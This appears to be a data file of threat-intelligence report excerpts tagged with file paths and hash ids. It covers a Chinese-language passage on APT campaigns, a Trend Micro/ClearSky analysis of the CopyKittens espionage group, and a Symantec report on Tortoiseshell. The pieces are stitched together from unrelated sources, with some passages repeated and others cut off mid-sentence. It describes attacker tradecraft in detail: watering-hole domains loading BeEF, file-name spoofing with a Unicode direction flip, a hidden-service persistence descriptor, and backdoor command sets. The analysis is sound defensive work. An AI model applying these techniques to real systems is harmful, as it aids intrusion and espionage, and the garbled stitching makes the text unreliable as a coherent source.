城市区域性攻击活动愈见明显，尤其随着城市数字化转型快速发展，APT攻击打法也会随之调整升级。

01.针对城市区域性的攻击威胁不断

针对我国的攻击活动中以朝鲜半岛、南亚等地区的APT组织最为显著，其中如 Darkhotel 、旺刺，以及今

年新捕获的芜琼洞等组织，相关攻击活动都是以地域性特征为主，行业领域并不是其首要关注的。尤其是

Darkhotel 组织是长期围绕我国某地区，针对多个不同行业领域的单位或个人发起定向攻击。而南亚和东

南亚组织攻击活动的地域性特性更多呈现周期性，尤其是在出现重大热点事件期间尤为明显。

APT化的定向勒索攻击针对市政公共设施和公共服务部门的攻击事件也层出不穷。今年 4月末 Babuk 勒

索病毒成功攻击美国华盛顿警方并窃取超 250GB 数据，在攻击者不接受支付赎金后，暗网公布了大量窃

塔尔萨市议会、塔尔萨警察局等网站也被关闭进行维护，严重影响到居民的正常生活。

无论是地缘政治背景下的APT攻击活动，还是暴利驱使下的勒索病毒威胁，在对城市安全造成重大挑战面

前，急需围绕数据安全、网络安全，加快构建与城市数字化转型相适应的大安全格局。

3.ICT供应链攻击威胁进一步升级

2020 年以供应商为核心目标的供应链攻击已趋于常态主流化，而今年上半年针对 ICT（ Information

and Communication Technology，信息通信技术）供应商的供应链攻击更是进一步增加，从供应

设计研发到服务运维多个阶段都有涉及。海莲花组织更是将供应商攻击作为其主要攻击战术，2021年上

半年的攻击活动中涉及多个头部软件供应商，较去年主要针对教育、政府以外，进一步涉及军工、科研等，

而且主要针对供应商作业环境中的服务器设备。另外值得注意的是，去年年底蔓灵花组织积极探索的一种

新型供应链攻击，今年已成常态主流。这类攻击目标并不是供应商和最终目标需求方，而是起到中介服务

的招标代理机构。

01.倾向目标行业头部供应商

APT攻击活动的范畴主要取决于行业领域和具体单位目标，而针对某行业领域的攻击，实质上还是针对所

属该行业的具体单位企业，只是目标更加广泛。而这些专注针对某一行业的 ICT供应商，却间接起到中心

化管理角色，也就是仅需针对该供应商攻击，其攻击收益是对应整个行业的目标单位，这也是导致 APT青

睐攻击这类供应商的原因。如海莲花针对高校领域的供应商就是这种情况。

02.优选目标单位强依赖供应商

在针对具体某单位的攻击中，APT 组织会优先针对与该单位有密切合作的供应商，尤其是长期提供专属

ICT 服务的。由于供应商与服务单位之间紧密的合作关系，APT由此更容易接触目标单位核心业务等资

源。比如去年魔鼠组织针对国内头部邮件系统服务提供商。

052

RESEARCH REPORT

03.针对中介招标代理机构的攻击也需警惕

去年11 月，我们捕获到蔓灵花组织针对供应链供应环节的一种新型攻击，这类攻击目标并不是供应商和最

终目标需求方，而是起到中介服务的招标代理机构，这类机构起到企业和供应商之间的桥梁，虽然不提供

具体产品或服务，但其能接触到完整的供需采购信息。

今年上半年该领域已成 APT 组织常态重点攻击目标范畴。我们发现被攻击的招标代理机构一般都有国资

背景，其服务客户更多是国防军工、政府机构等重点单位。不难想象如果 APT组织掌握了招标代理机构相

关核心机密信息，那相应客户的完整供需关系即了如指掌。我们推测 APT 组织针对中介商的攻击意图，是

其由此能获得更立体更全面的作战信息。

4.针对高等学校的攻击活动实则瞄准了我国国防军工和科

技创新体系

今年上半年针对我国教育领域的攻击较去年又有进一步上升，近两年针对我们的攻击活动中，除政府机构

以外，教育领域受影响最为严重，而其中高等学校是主要被攻击目标。高等院校是集聚高层次人才的战略"|data_input/Oilrig_reports/entry_dad87900-4f16-484a-88d6-dbc3e953a5b6.text|6bd7b69951a8486e9014944802d80663

技创新体系

今年上半年针对我国教育领域的攻击较去年又有进一步上升，近两年针对我们的攻击活动中，除政府机构

以外，教育领域受影响最为严重，而其中高等学校是主要被攻击目标。高等院校是集聚高层次人才的战略

高地，作为培养优秀人才的沃土、发展科研事业的基地，在建设世界科技强国的进程中，高校具有不可替代

的作用。而 APT 组织针对高等学校的攻击活动，其实际意图是瞄准了我国的国防军工和科技创新体系，以

窃取相关机密情报为最终目的。

Introduction CopyKittens is a cyberespionage group that has been operating since at least 2013. In November 2015, ClearSky and Minerva Labs published1 the first public report exposing its activity. In March 2017, ClearSky published a second report2 exposing further incidents, some of which impacted the German Bundestag. In this report, Trend Micro and ClearSky expose a vast espionage apparatus spanning the entire time the group has been active. It includes recent incidents as well as older ones that have not been publicly reported; new malware; exploitation, delivery and command and control infrastructure; and the group's modus operandi. We dubbed this activity Operation Wilted Tulip"|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|751d79ad47184ce9be796de0e69c8aec
Targetting CopyKittens is an active cyber espionage actor whose primary focus appears to be foreign espionage on strategic targets. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks. For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel. Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments. Fake Facebook profiles have been used for spreading malicious links and building trust with targets. Some of the profiles have been active for years.|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|04fce709f2a34aa991821becd85c2372
"Malware CopyKittens use several self-developed malware and hacking tools that have not been publicly reported to date, and are analyzed in this report: TDTESS backdoor; Vminst, a lateral movement tool; NetSrv, a Cobalt Strike loader; and ZPP, a files compression console program. The group also uses Matryoshka v1, a selfdeveloped RAT analyzed by ClearSky in the 2015 report, and Matryoshka v2 which is a new version, albeit with similar functionality. The group often uses the trial version of Cobalt Strike3, a publicly available commercial software for ""Adversary Simulations and Red Team Operations."" Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, ""a PowerShell and Python post-exploitation agent."" For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap. A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration. This feature is available both in Cobalt Strike and in Matryoshka. Most of the infrastructure used by the group is in the U.S., Russia, and The Netherlands. Some of it has been in use for more than two years.

Targeting Based on Trend Micro Telemetry, incident response engagements, and open source threat intelligence investigations, we have learned of CopyKittens target organizations and countries. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks. For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel. Based on the size of the attack infrastructure and length of the campaign, we estimate that there have been at least a few hundred people infected in multiple organizations in the targeted countries."|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|0620120f091d44fc9edd4bad699db2fe
"After infecting a computer within a target organization, the attacker would move latterly using one of the malware descried in chapter ""Malware."" It seems that their objective is to gather as much information and data from target organizations as possible. They would indiscriminately exfiltrate large amounts of documents, spreadsheets, file containing personal data, configuration files and databases. In at least one case, the attackers breached an IT company, and used VPN access it had to client organizations to breach their networks. Often, victim organizations would learn of the breach due to the non-stealthy behavior of the attackers. The attackers would ""get greedy,"" infecting multiple computers within the network of breached organizations. This would raise an alarm in various defense systems, making the victims initiate incident response operations.

Delivery and Infection CopyKittens attack their targets using the following methods: •

Watering hole attacks – inserting malicious JavaScript code into breached strategic websites.

Web based exploitation – emailing links to websites built by the attackers and containing known exploits.

Malicious documents – email attachments containing weaponized Microsoft Office documents.

Fake social media entities – fake personal and organizational Facebook pages are used for interaction with targets and for information gathering."|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|33243bd5f0304175901e175364b40358
"Fake social media entities – fake personal and organizational Facebook pages are used for interaction with targets and for information gathering.

Web hacking – Havij, Acuntix and sqlmap are used to detect and exploit internet-facing web servers.

These methods are elaborated below.

Watering Hole Attacks On 30 March 2017, ClearSky reported a breach of multiple websites, such as Jerusalem Post, Maariv news and the IDF Disabled Veterans Organization website.4 JavaScript code was inserted into the breached websites, loading BeEF (Browser Exploitation Framework) from domains owned by the attackers .5 For example:

Malicious code added to Maariv website"|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|c0553f11c9824df4b0b045d2584c3390
"Malicious code added to Maariv website

The malicious code was loaded from one of the following addresses: https://js.jguery[. ]net/jquery.min.js https://js.jguery[. ]online/jgueryui.min.js This would enable the attackers to perform actions such as browser fingerprinting and information gathering, social engineering attacks (like asking for credentials, redirect to another page, asking the user to install a malicious extension or malware), network reconnaissance, infecting the computer using Metasploit exploits, and more.6 The malicious code was served only when specific targets visited the website, likely based on IP whitelisting. Notably, prior to that publication, the German Federal Office for Information Security (BSI) said in a statement that it had investigated ""problems in network traffic"" of the German Bundestag.7 The statement concluded that the website of Israeli newspaper Jerusalem Post was manipulated and linked to a harmful third party in January 2017.

"Web-Based Exploitation In two incidents, the attackers breached the mailbox of a person related to a target organization. From this (real) account, they replied to previous correspondences with these organizations, adding a malicious link to a website registered and built by attackers: primeminister-goverment-techcenter].[tech. 8 JavaScript code, at least parts of which were copied from public sources, fingerprinted the visitor's web browser.9 This was likely used for later browser exploitation with known vulnerabilities. In some pages the code enumerates and collects a list of installed browser plugins, in others it tries to detect the real IP of the computer:

Browser Plugins enumeration via JavaScipt code

Internal IP detection with Java

The data is sent to the attackers, and the victim is redirected to https://akamitechnology[. ]com/.

"JavaScript and Java code loaded into webpage, victim is redirected after 20 seconds

Malicious Documents The attackers use three document based exploitation types: exploiting CVE-2017-0199, embedding OLE objects, and macros. If the victim opens a document and the exploitation is successful (in the latter two, user interaction might be required), the attackers would receive access to the computer via self-developed or publicly available malware (see ""Malware"" chapter for more details).

Exploiting CVE-2017-0199 On 26 April 2017, a malicious email was sent from an employee account that was likely breached within the Ministry of Northern Cyprus. It was sent to a disclosed recipients list in government institutions in several countries and other organizations, mostly in or related to ministries of foreign affairs. We should note, however, that it is possible that the attackers were interested only in a few of the recipient organizations, but sent it to a wider list because they showed up in previous correspondences in the breached account. Recipients were in the following domains: mofa.gov.vn mfa.gov.sg mfa.gov.tr post.mfa.uz mfa.am mfa.gov.by beijing.mfa.gov.il mofat.go.kr mfa.no mofa.go.jp

Embedded OLE Objects In February 2017 a document titled ""ssl.docx"" was delivered to targets, likely via email.14 It asked the recipient to ""Please Update Your VPN Client from This Manual"" [sic].

Content of the malicious document asking the victim to update the VPN Client

The ""VPN Client manual"" was an embedded OLE binary object, an executable with a reverse file extension: checkpointsslvpn?fdp.exe. 15 (The ""?"" stands for an invisible Unicode character that flips the direction of the string, making it look like a PDF file ""exe.pdf. "")16 It was composed of two files: a self-extracting executable and a PDF.

The self-extracting executable contains another executable, named p.exe, which was digitally signed with a stolen certificate of a legitimate company called AI Squared.

Interestingly, this digital certificate was used by a threat group called Oilrig.17 This might indicate the two groups share resources or otherwise collaborate in their activity.

Malicious Macros In October 2016, the attackers uploaded to VirusTotal multiple files containing macros, likely to learn if they are detected by antivirus engines. For example, ""Date.dotm"" contains this default Word template content:20

Fake profile ""‫""גסיקה כהן‬

While ""Erik Brown"" has not been publicly active since September 2015, and the two other Israeli profiles have not been publicly active since September 2013, Amanda Morgan is still active to date. She has thousands of friends and 2,630 followers, many of which are Israeli. In 2015 she sent her friends an invitation to Like a Facebook page: ""Emet press.""

Amanda Morgan invites its friends to like ""Emet press""

Emet press (Emet means ""truth"" in Hebrew), is described as a non-biased news aggregator operated by Israeli students aboard. However, the Hebrew text is clearly not written by someone who speaks Hebrew as a first language:

Neither the Facebook page nor website have been used to spread malicious or fake content publicly. We estimate that they were used to build trust with targets, and potentially send malicious content in private messages, however we do not have evidence of such activity. Looking at the website source code reveals that it was built with NovinWebGostar, a website building platform.

Web Hacking Based on logs from internet-facing web servers in target organizations, we have detected that CopyKittens use the following tools for web vulnerability scanning and SQL Injection exploitation. Havij: ""An automatic SQL Injection tool, [which is] distributed by ITSecTeam, an Iranian security company. ""29 Havij is freely distributed and has a graphical user interface. It is commonly used for automated SQL Injection and vulnerability assessments. sqlmap: An ""automatic SQL Injection and database takeover tool. ""30 sqlmap is an open source penetration testing tool that automates the process of detecting and exploiting SQL Injection flaws and taking over database servers. It is capable of database fingerprinting, data fetching from the database, and accessing the underlying file system and executing commands on the operating system via out-of-band connections.

Noteworthy observations about the domains: • Domains impersonate one of four categories: ▪ Major internet and software companies and services – Microsoft, Google, Akamai, Cloudflare, Amazon, Oracle, Facebook, Cisco, Twitter, Intel ▪ Security companies and products – Trend Micro, McAfee, Microsoft Defender, and potentially Cellebrite ▪ Israeli organizations of interest to the victim – News originations, Israeli Prime Minister Office, an Israeli ISP ▪ Other organizations or generic web services • The attackers always use Whoisguard for Whois details protection.33 • Domains are usually registered in bulk every few months. • Long subdomains are created like those used by Content Delivery Networks. For example: wk-in-f104.1e100.n.microsoft-security[. ]host ns1.static.dyn-usr.gsrv01.ssl-gstatic[. ]online c20.jdk.cdn-external-ie.1e100.alkamaihd[. ]net msnbot-sd7-46-194.microsoft-security[. ]host ns2.static.dyn-usr.gsrv02.ssl-gstatic.online static.dyn-usr.g-blcse.d45.a63.alkamaihd[. ]net ea-in-f155.1e100.microsoft-security[. ]host is-cdn.edge.g18.dyn.usr-e12-as.akamaitechnology[. ]com static.dyn-usr.f-login-me.c19.a23.akamaitechnology[. ]com pht.is.nlb-deploy.edge-dyn.e11.f20.ads-youtube[. ]online ae13-0-hk2-96cbe-1a-ntwk-msn.alkamaihd[. ]com be-5-0-ibr01-lts-ntwk-msn.alkamaihd[. ]com a17-h16.g11.iad17.as.pht-external.c15.qoldenlines[. ]net • Some of the domains have been in use for more than two years.

Often the attackers would point malicious domains to IPs not in their control. For example, as can be seen in the screenshot below from PassiveTotal, multiple domains and hosts (marked red) were pointed to a nonmalicious IP owned by Google.3435

Multiple domains and hosts pointing to a non-malicious IP owned by Google

This pattern was instrumental for us in pivoting and detecting further malicious domains.

"Malware In this chapter we analyze and review malware used by CopyKittens.

TDTESS Backdoor TDTESS (22fd59c534b9b8f5cd69e967cc51de098627b582) is 64-bit .NET binary backdoor that provides a reverse shell with an option to download and execute files. It routinely calls in to the command and control server for new instructions using basic authentication. Commands are sent via a web page. The malware creates a stealth service, which will not show on the service manager or other tools that enumerate services from WINAPI or Windows Management Instrumentation."|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|0be978d078dc41a2957169a5f89d90b6
"Installation and removal TDTESS can run as either an interactive or non-interactive (service) program. When called interactively, it receives one of the two arguments: installtheservice to install itself or uninstalltheservice to remove itself. The arguments are described below: installtheservice If running with administrator privileges, it will install a service with the following characteristics: Key name: bmwappushservice Display name: bmwappushsvc Description: WAP Push Message Routing Service Type: own (runs in its own process) Start type: auto (starts each time the computer is restarted and runs even if no one logs on to the computer) Path: <main executable path> (In our analysis: c:\Users\PC008\Desktop\t.exe) Security descriptor: D:(D;;DCLCWPDTSD;;;IU)(D;;DCLCWPDTSD;;;SU)(D;;DCLCWPDTSD;;;BA)(A;;CCLCSWLOCRRC;;;IU)(A;;CCLC SWLOCRRC;;;SU)(A;;CCLCSWRPWPDTLOCRRC;;;SY)(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;BA)S:(AU;F A;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;WD)

Service information from command

line using sc tool

The hardcoded security descriptor used to create the service is a persistence technique. Interactive users, even if they are administrators, cannot stop or even see the service in services.msc snap-in.

"Service information in Registry

Two log files are created during the service installation, but deleted by the program. Following is their recovered content:

InstallUtil.InstallLog

<filename>.t.InstallLog

After creating the service, it will update the file creation time to that of the following file: %windir%\system32\svchost.exe

Page 28 of 48 ©All rights reserved to ClearSky cyber security and Trend Micro, 2017

uninstalltheservice If running with administrator privileges, it will uninstall the said service, create log files and then deletes them.

InstallUtil.InstallLog

<filename>.t.InstallLog

Because the service installing mechanism appears to be default for .NET programs, the creator of the tool deletes the log files right after they are created. If no argument is given when called interactively, the program terminates itself.

Functionality The service is started immediately after installation. After five minutes, it verifies internet connectivity by making a HTTP HEAD request to microsoft.com. Then it tries to access the C&C servers looking for commands.

Hardcoded HTTP parameters and URL

Vminst for Lateral Movement Vminst (a60a32f21ac1a2ec33135a650aa8dc71) is a lateral movement tool used to infect hosts in the network using previously stolen credentials. It Injects Cobalt Strike into memory of infected hosts. The binary implements ServiceMain and is intended to be installed as a service named “sdrsrv.” When it functions as a service, it injects Cobalt Strike beacon into its own process (which is 32-bit “svchost”) or creates a new 32-bit “rundll32” process and injects the beacon into the new process. The injection method depends on the parameter received when the service was created. It is configured to open a new “rundll32” process in suspend-mode and create a remote thread which executes a Cobalt Strike beacon or shellcode. The binary has the option to run and load itself in memory. It also has the option to be executed through its exported function ""v,"" which gets a base64 string parameter built as follows: Base-64-Encode(“/mv /OptionalCommand”) OptionalCommand can be one of the following: •

Matryoshka v1 – RAT Matryoshka v1 is a RAT analyzed in the 2015 report by ClearSky and Minerva.38 It uses DNS for command and control communication, and has common RAT capabilities such as stealing Outlook passwords, screen grabbing, keylogging, collecting and uploading files, and giving the attacker Meterpreter shell access. We have seen this version of Matreyoshka in the wild from July 2016 until January 2017. The Matryoshka.Reflective_Loader injects the module Matryoshka.Rat, which has the same persistence keys and communication method described in the original report.

Matreyoshka v2 – RAT Matryoshka v2 (bd38cab32b3b8b64e5d5d3df36f7c55a) is mostly like Matreyoshka v1 but has fewer commands and a few other minor changes. Upon starting it will inject the communication module to all available processes (with the same run architecture and the same or lower level of permission). The inner name of Svchost’s is Injector.dll. The next stage, in memory, is ReflectiveDLL.dll. The ReflectiveDLL.dll provides persistence via a schedule task and checks that the stager, Injector.dll, exist on disk. ReflectiveDLL.dll gets commands via the following DNS resolutions: Command

ZPP – File Compressor ZPP (bcae706c00e07936fc41ac47d671fc40) is a .NET console program that compresses files with the ZIP algorithm. It can transfer compressed files to a remote network share. Command line options are as follows: -I - File extension to compress (i.e. : .txt) -s - Source directory -d - Destination directory -gt - Greater than creation timestamp -lt - Lower than creation timestamp -mb - Unimplemented -o - Output file name -e - File extension to skip (except)

ZPP"|data_input/Oilrig_reports/entry_464d368e-29a6-4fd8-b1cb-b08b0e81e0dd.text|40fec8fd21d249febff08802b4a75330
"ZPP

ZPP will recursively read all files in the source directory to compress them with the maximum compression rate if their names match the extension pattern given (-i). The compressed ZIP file is written to the output directory (-d). If no output file name is set, ZPP will use the mask zpp<random_number>.out. <file_number>. For example:

Filename is zpp5077.out0

The file compilation timestamp is Tue, 05 Jul 2016 17:22:59 UTC. ad09feb76709b825569d9c263dfdaaac is a previous version (compilation timestamp: Sat, 09 Jan 2016 17:02:38 UTC) and is only different in that it accepts the –e switch, which ignored by the program logic. 214be584ff88fb9c44676c1d3afd7c95 is the newest version (compilation timestamp: Mon, 26 Sep 2016 19:49:34 UTC). It is supposed to implement the –s switch but although it is set when the user gives it to the program, the switch is ignored by the code.

ZPP version 2.0

ZPP seems to be under development. All versions have bugs. It uses the reduced version of DotNetZip library. 39 Therefore, it requires Ionic.Zip.Reduced.dll (7c359500407dd393a276010ab778d5af) to be under the same directory or %PATH%. Function doCompressInNetWorkDirectory() is intended to exfiltrate date from a target machine to a network share.

Cobalt Strike Cobalt Strike is a publicly available commercial software for ""Adversary Simulations and Red Team Operations. ""40 While not malicious in and of itself, it is often used by cybercrime groups and state-sponsored threat groups, due to its post-exploitation and covert communication capabilities. 41 4243 44 CopyKittens use the free 21-day trial version of Cobalt Strike. Thus, malicious communication generated by the tool is much easier to detect, because a special header is sent in each HTTP GET transaction. The special header is ""X-Malware,"" i.e. there is a literal indication that ""this network communication is malicious."" All that

Metasploit A well-known free and open source framework for developing and executing exploit code against a remote target machine.47 It has more than 1,610 exploits, as well as more than 438 payloads, which include command shell that enables users to run collection scripts or arbitrary commands against the host. Meterpreter, which enables users to control the screen of a device using VNC and to browse, upload and download files. It also employs dynamic payloads that enables users to evade antivirus defenses by generating unique payloads.48

On the PowerShell side, Empire implements the ability to run PowerShell agents without needing powershell.exe, rapidly deployable postexploitation modules ranging from key loggers to Mimikatz, and adaptable communications to evade network detection, all wrapped up in a usability-focused framework.""

Tortoiseshell Group Targets IT Providers in Saudi Arabia in Probable Supply Chain Attacks | Symantec Blogs

Tortoiseshell Group Targets IT Providers in Saudi Arabia in Probable Supply Chain Attacks symantec.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain

A previously undocumented attack group is using both custom and off-the-shelf malware to target IT providers in Saudi Arabia in what appear to be supply chain attacks with the end goal of compromising the IT providers’ customers. The group, which we are calling Tortoiseshell, has been active since at least July 2018. Symantec has identiﬁed a total of 11 organizations hit by the group, the majority of which are based in Saudi Arabia. In at least two organizations, evidence suggests that the attackers gained domain adminlevel access. ""#Tortoiseshell group uses custom malware, off-the-shelf tools, #livingofftheland techniques to compromise victims https://symc.ly/2lV4Ovn"" Another notable element of this attack is that, on two of the compromised networks, several hundred computers were infected with malware. This is an unusually large number of computers to be compromised in a targeted attack. It is possible that the attackers were forced to infect many machines before ﬁnding those that were of most interest to them. We have seen Tortoiseshell activity as recently as July 2019."|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|bdcd4b1ac97d4d8a822159deb9e262a6
"Custom tools The unique component used by Tortoiseshell is a malware called Backdoor.Syskit. This is a basic backdoor that can download and execute additional tools and commands. The actors behind it have developed it in both Delphi and .NET.

Backdoor.Syskit is run with the “-install” parameter to install itself. There are a number of minor variations of the backdoor, but the primary functionality is the following: reads conﬁg ﬁle: %Windir%\temp\rconﬁg.xml writes Base64 encoding of AES encrypted (with key ""fromhere"") version of the data in the ""url"" element of the XML to: HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\system\Enablevmd This contains the command and control (C&C) information. writes Base64 encoding of AES encrypted (with key ""fromhere"") version of the ""result"" element of the XML to: HKEY_LOCAL_MACHINE\software\microsoft\windows\currentversion\policies\system\Sendvmd This holds the later portion of the URL to append to the C&C for sending information to it. deletes the conﬁg ﬁle The malware collects and sends the machine’s IP address, operating system name and version, and Mac address to the C&C server using the URL in the Sendvmd registry key mentioned above. Data sent to the C&C server is Base64 encoded. The backdoor can receive various commands: ""kill_me"": stops the dllhost service and deletes %Windir%\temp\bak.exe ""upload "" downloads from the URL provided by the C&C server ""unzip"" uses PowerShell to unzip a speciﬁed ﬁle to a speciﬁed destination, or to run cmd.exe /c <received command>"|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|53d2b0be7da545a8affb5c91d0794c48
"Tools, techniques, and procedures The other tools used by the group are public tools, and include: Infostealer/Sha.exe/Sha432.exe Infostealer/stereoversioncontrol.exe get-logon-history.ps1 Infostealer/stereoversioncontrol.exe downloads a RAR ﬁle, as well as the get-logon-history.ps1 tool. It runs several commands on the infected machine to gather information about it and also the Firefox data of all users of the machine. It then compresses this information before transferring it to a remote directory. Infostealer/Sha.exe/Sha432.exe operates in a similar manner, gathering information about the infected machine. We also saw Tortoiseshell using other dumping tools and PowerShell backdoors. The initial infection vector used by Tortoiseshell to get onto infected machines has not been conﬁrmed, but it is possible that, in one instance, a web server was compromised to gain access by the attacker. For at least one victim, the ﬁrst indication of malware on their network was a web https://www.symantec.com/blogs/threat-intelligence/tortoiseshell-apt-supply-chain

shell (d9ac9c950e5495c9005b04843a40f01fa49d5fd49226cb5b03a055232ffc36f3). This indicates that the attackers likely compromised a web server, and then used this to deploy malware onto the network."|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|c789049fb5a74100b824cd40c669e2a7
This activity indicates the attackers had achieved domain admin level access on these networks, meaning they had access to all machines on the network. Once on a victim computer, Tortoiseshell deploys several information gathering tools, like those mentioned above, and retrieves a range of information about the machine, such as IP conﬁguration, running applications, system information, network connectivity etc. On at least two victim networks, Tortoiseshell deployed its information gathering tools to the Netlogon folder on a domain controller. This results in the information gathering tools being executed automatically when a client computer logs into the domain. This activity indicates the attackers had achieved domain admin level access on these networks, meaning they had access to all machines on the network.|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|e5ab40c05363451a83e8297f58b9fe8e
Presence of OilRig tools In one victim organization, we also saw a tool called Poison Frog deployed one month prior to the Tortoiseshell tools. Poison Frog is a backdoor and a variant of a tool called BondUpdater, which was previously seen used in attacks on organizations in the Middle East. The tools were leaked on Telegram in April this year and are associated with the group known as APT34, aka Oilrig. It is unclear if the same actor deployed both the Poison Frog tool and the Tortoiseshell tools, however, given the gap in time between the two sets of tools being used, and without further evidence, the current assumption is that the activity is unrelated. If that is the case, this activity demonstrates the interest from multiple attack groups in industries in this region. The Poison Frog tool also appears to have been leaked prior to deployment to this victim, so could be used by a group unrelated to APT34/Oilrig.|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|46a87e490e654c4bb1b5c23ce4f30cc2
Attacker motives The targeting of IT providers points strongly to these attacks being supply chain attacks, with the likely end goal being to gain access to the networks of some of the IT providers’ customers. Supply chain attacks have been increasing in recent years, with a 78 percent increase in 2018, as we covered in ISTR 24. Supply chain attacks, which exploit third-party services and software to compromise a ﬁnal target, take many forms, including hijacking software updates and injecting malicious code into legitimate software. IT providers are an ideal target for attackers given their high level of access to their clients’ computers. This access may give them the ability to send malicious software updates to target machines, and may even provide them with remote access to customer machines. This provides access to the victims’ networks without having to compromise the networks themselves, which might not be possible if the intended victims have strong security infrastructure, and also reduces the risk of the attack being discovered. The targeting of a third-party service provider also makes it harder to pinpoint who the attackers’ true intended targets were. The customer proﬁles of the targeted IT companies are unknown, but Tortoiseshell is not the ﬁrst group to target organizations in the Middle East, as we have covered in previous blogs.|data_input/Oilrig_reports/entry_aa1cd63b-bc2c-4548-865e-8a8ba9f19876.text|f54a1f05e76140f4a74aa5e44e976a49

Introduction CopyKittens is a cyberespionage group that has been operating since at least 2013. In November 2015, ClearSky and Minerva Labs published1 the first public report exposing its activity. In March 2017, ClearSky published a second report2 exposing further incidents, some of which impacted the German Bundestag. In this report, Trend Micro and ClearSky expose a vast espionage apparatus spanning the entire time the group has been active. It includes recent incidents as well as older ones that have not been publicly reported; new malware; exploitation, delivery and command and control infrastructure; and the group's modus operandi. We dubbed this activity Operation Wilted Tulip"|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|c6a1d203b0394a37b82b94be5f1dcf21
Targetting CopyKittens is an active cyber espionage actor whose primary focus appears to be foreign espionage on strategic targets. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks. For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel. Victims are targeted by watering hole attacks, and emails with links to malicious websites or with malicious attachments. Fake Facebook profiles have been used for spreading malicious links and building trust with targets. Some of the profiles have been active for years.|data_input/Oilrig_reports/entry_0175142c-6ad1-4f27-8fde-7f319f6b29bf.text|322e89c68d064544b72bb5914e2a4994
"Malware CopyKittens use several self-developed malware and hacking tools that have not been publicly reported to date, and are analyzed in this report: TDTESS backdoor; Vminst, a lateral movement tool; NetSrv, a Cobalt Strike loader; and ZPP, a files compression console program. The group also uses Matryoshka v1, a selfdeveloped RAT analyzed by ClearSky in the 2015 report, and Matryoshka v2 which is a new version, albeit with similar functionality. The group often uses the trial version of Cobalt Strike3, a publicly available commercial software for ""Adversary Simulations and Red Team Operations."" Other public tools used by the group are Metasploit, a well-known free and open source framework for developing and executing exploit code against a remote target machine; Mimikatz, a post-exploitation tool that performs credential dumping; and Empire, ""a PowerShell and Python post-exploitation agent."" For detection and exploitation of internet-facing web servers, CopyKittens use Havij, Acunetix and sqlmap. A notable characteristic of CopyKittens is the use of DNS for command and control communication (C&C) and for data exfiltration. This feature is available both in Cobalt Strike and in Matryoshka. Most of the infrastructure used by the group is in the U.S., Russia, and The Netherlands. Some of it has been in use for more than two years.

Targeting Based on Trend Micro Telemetry, incident response engagements, and open source threat intelligence investigations, we have learned of CopyKittens target organizations and countries. Its main targets are in countries such as Israel, Saudi Arabia, Turkey, The United States, Jordan, and Germany. Occasionally individuals in other countries are targeted as well as UN employees. Targeted organizations include government institutions (such as Ministry of Foreign Affairs), academic institutions, defense companies, municipal authorities, sub-contractors of the Ministry of Defense, and large IT companies. Online news outlets and general websites were breached and weaponized as a vehicle for watering hole attacks. For example, a malicious email was sent from a breached account of an employee in the Ministry of Foreign Affairs in the Turkish Republic of Northern Cyprus, trying to infect multiple targets in other government organizations worldwide. In a different case, a document likely stolen from the Turkish Ministry of Foreign affairs was used as decoy. In other cases, Israeli embassies were targeted, as well as foreign embassies in Israel. Based on the size of the attack infrastructure and length of the campaign, 